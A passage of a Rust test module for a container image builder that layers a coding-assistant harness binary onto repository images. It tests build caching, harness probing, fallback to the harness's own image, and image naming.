            &LocalRunner,
            &Config::default(),
            &store,
            repo,
            &missing,
            &[],
            false,
        )
        .await;
        let Ensured::Unavailable { reason } = unavailable else {
            panic!("a Dockerfile the default branch does not hold cannot build");
        };
        assert!(
            reason.contains("docker/Dockerfile is not in origin/main"),
            "{reason}"
        );

        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        *builder.pruned.lock().unwrap() = true;
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
    }

    #[tokio::test]
    async fn a_command_the_image_has_no_tool_for_is_named_when_it_is_built() {
        let commands = [
            "sh -c true".to_string(),
            "tracon-no-such-tool --check".to_string(),
            "FOO=1 make".to_string(),
            "./scripts/check.sh".to_string(),
        ];
        assert_eq!(
            missing_tools(&LocalRunner, "ignored", &commands).await,
            ["tracon-no-such-tool --check"]
        );
    }

    /// Answers the harness probe with whatever the test says the image does.
    struct ProbeRunner {
        says: &'static str,
        exit: i32,
        ran_in: StdMutex<Vec<String>>,
    }

    impl ProbeRunner {
        fn saying(says: &'static str, exit: i32) -> Self {
            Self {
                says,
                exit,
                ran_in: StdMutex::new(Vec::new()),
            }
        }
    }

    #[async_trait]
    impl Runner for ProbeRunner {
        async fn spawn(
            &self,
            _cmd: RunnerCommand,
        ) -> Result<crate::runner::Spawned, crate::runner::RunnerError> {
            Err(crate::runner::RunnerError::Other("not used here".into()))
        }
        async fn run_capture(
            &self,
            cmd: RunnerCommand,
        ) -> Result<std::process::Output, crate::runner::RunnerError> {
            use std::os::unix::process::ExitStatusExt;
            self.ran_in
                .lock()
                .unwrap()
                .push(cmd.image.unwrap_or_default());
            Ok(std::process::Output {
                status: std::process::ExitStatus::from_raw(self.exit << 8),
                stdout: self.says.as_bytes().to_vec(),
                stderr: Vec::new(),
            })
        }
        async fn kill(&self, _name: &str) -> Result<(), crate::runner::RunnerError> {
            Ok(())
        }
    }

    const BASE_IMAGE: &str =
        "localhost/tracon-repo-app@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

    fn claude(image: &str) -> SessionHarness<'static> {
        SessionHarness {
            id: "claude",
            version: "2.1.247",
            image: image.to_string(),
            layer: harness_layer("claude").unwrap(),
        }
    }

    /// The harness goes onto the repository's image as a layer, proven to run
    /// there, and is rebuilt when the harness image moves — which leaves the
    /// repository's image, and every check's evidence, where it was.
    #[tokio::test]
    async fn the_harness_is_layered_onto_the_repository_image_and_follows_the_harness() {
        let repo = Path::new("/src/app");
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let runner = ProbeRunner::saying("2.1.247 (Claude Code)\ngit version 2.50", 0);
        let harness = claude("localhost/tracon-harness-claude");

        let first =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        let image = first.image.clone().expect("the session image is built");
        assert_eq!(first.toolchain_image.as_deref(), Some(BASE_IMAGE));
        assert_eq!(first.note, None);
        assert_eq!(first.source(), "repository image");
        // Proven in the image that was built, not in the harness's own.
        assert_eq!(
            runner.ran_in.lock().unwrap().as_slice(),
            std::slice::from_ref(&image)
        );
        {
            let builds = builder.builds.lock().unwrap();
            let text = &builds[0].1;
            assert!(text.starts_with("FROM localhost/tracon-harness-claude@sha256:"));
            assert!(text.contains(&format!("FROM {BASE_IMAGE}\n")));
            assert!(text.contains("COPY --from=harness /usr/local/bin/claude"));
            assert!(text.contains("USER 0:0") && text.contains("ENTRYPOINT []"));
        }

        // Asked again, nothing is built and nothing is probed.
        let again =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert_eq!(again, first);
        assert_eq!(builder.builds.lock().unwrap().len(), 1);

        // A harness image that moved is a new layer over the same base.
        let upgraded = claude("localhost/tracon-harness-claude-next");
        let next =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &upgraded).await;
        assert_ne!(next.image, first.image);
        assert_eq!(next.toolchain_image.as_deref(), Some(BASE_IMAGE));
        let removed = builder.removed.lock().unwrap();
        assert!(removed.contains(&image));
        assert!(!removed.iter().any(|gone| gone == BASE_IMAGE));
    }

    /// A harness that does not run in the repository's image is found when the
    /// layer is built. The session keeps the harness's own image and is told
    /// why, and the build is not repeated at every start.
    #[tokio::test]
    async fn a_harness_that_does_not_run_in_the_image_leaves_the_session_in_its_own() {
        let repo = Path::new("/src/musl-app");
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let harness = claude("localhost/tracon-harness-claude");
        for (says, exit) in [("sh: claude: not found", 127), ("9.9.9 (Claude Code)", 0)] {
            let store = Store::open_in_memory().unwrap();
            let runner = ProbeRunner::saying(says, exit);
            let got =
                ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
            assert_eq!(got.image, None, "{says}");
            assert_eq!(got.source(), "harness image");
            assert!(got.note.unwrap().contains("does not run"), "{says}");
            let row = store
                .latest_repo_image("/src/musl-app", "session:claude")
                .unwrap()
                .unwrap();
            assert_eq!(
                (row.status.as_str(), row.log_tail.as_str()),
                ("failed", says)
            );
        }
        assert_eq!(builder.removed.lock().unwrap().len(), 2);

        let runner = ProbeRunner::saying("nope", 1);
        ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        let builds = builder.builds.lock().unwrap().len();
        let again =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert!(again.note.is_some());
        assert_eq!(builder.builds.lock().unwrap().len(), builds);
    }

    /// Which sessions get a repository image at all: one whose repository has
    /// an entry naming an image, on a harness that is a single binary, on a
    /// runtime that can build.
    #[tokio::test]
    async fn a_session_keeps_the_harness_image_where_no_repository_image_applies() {
        let backend: Arc<dyn Backend> = Arc::new(crate::runner::local::LocalBackend);
        let store = Arc::new(Store::open_in_memory().unwrap());
        let cfg = Arc::new(Config {
            repo: vec![Repo {
                path: "/src/app".into(),
                image: Some(BASE_IMAGE.into()),
                ..Default::default()
            }],
            ..Default::default()
        });
        let ask = |repo: &'static str, harness: &'static str| {
            let (backend, cfg, store) = (backend.clone(), cfg.clone(), store.clone());
            async move {
                let quiet = || panic!("nothing is built here");
                session_image(
                    &backend,
                    &cfg,
                    &store,
                    Path::new(repo),
                    (harness, "1"),
                    &quiet,
                )
                .await
            }
        };
        assert_eq!(ask("/src/other", "claude").await, SessionImage::default());
        let opencode = ask("/src/app", "opencode").await;
        assert!(opencode.image.is_none());
        assert!(opencode.note.unwrap().contains("runs in its own image"));
        let unbuildable = ask("/src/app", "claude").await;
        assert!(unbuildable.note.unwrap().contains("cannot build images"));
    }

    /// The layer copies the harness out of its image and has to set what that
    /// image sets; the image's own definition is the authority for both.
    #[test]
    fn the_claude_layer_carries_what_the_harness_image_sets() {
        let image = include_str!("../../containers/harness-claude/Containerfile");
        let layer = harness_layer("claude").unwrap().lines;
        assert!(image.contains("/usr/local/bin/claude"));
        for variable in [
            "CLAUDE_CONFIG_DIR=/root/.claude",
            "DISABLE_AUTOUPDATER=1",
            "DISABLE_TELEMETRY=1",
        ] {
            assert!(
                image.contains(variable),
                "{variable} left the harness image"
            );
            assert!(layer.contains(variable), "{variable} is not in the layer");
        }
        let exported: usize = image
            .lines()
            .skip_while(|line| !line.starts_with("ENV "))
            .take_while(|line| line.starts_with("ENV ") || line.starts_with("    "))
            .count();
        assert_eq!(
            exported, 3,
            "the harness image sets something the layer does not"
        );
        assert!(harness_layer("opencode").is_none());
    }

    #[test]
    fn image_names_are_readable_and_distinct() {
        let a = image_name(Path::new("/src/My App"));
        let b = image_name(Path::new("/other/My App"));
        assert!(a.starts_with("localhost/tracon-repo-my-app-"), "{a}");
        assert_ne!(a, b);
        assert!(a
            .trim_start_matches("localhost/")
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-'));
    }
}
